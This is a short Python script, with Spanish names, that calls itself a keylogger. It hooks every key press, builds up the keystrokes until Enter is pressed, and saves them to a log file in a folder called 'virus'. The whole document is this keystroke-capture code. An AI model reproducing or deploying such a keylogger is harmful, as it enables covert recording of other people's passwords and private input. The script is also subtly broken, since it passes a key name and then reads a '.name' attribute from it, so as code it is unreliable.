import keyboard
teclas = []
log_file = "log.txt"

def registrar(evento):
    tecla = evento.name

    if evento == 'space':
        tecla_registrada = " "
    elif evento == "enter": 
        tecla_registrada = "\n[ENTER]\n"
    elif len(evento)>1:
        tecla_registrada = f"[{evento.upper()}]"
    else:
        tecla_registrada = evento

    teclas.append(tecla_registrada)

    print(f"numero de teclas ({len(teclas)}): {tecla_registrada.strip()}")

print(f"keylogger iniciado. presione enter")

keyboard.on_press(lambda e: registrar(e.name))
keyboard.wait('enter') 

registro_completo = "".join(teclas)
with open (r"C:\Users\Home\Documents\virus\log.txt", "w") as f:
    f.write(registro_completo)

print("registro completo:", "".join(teclas))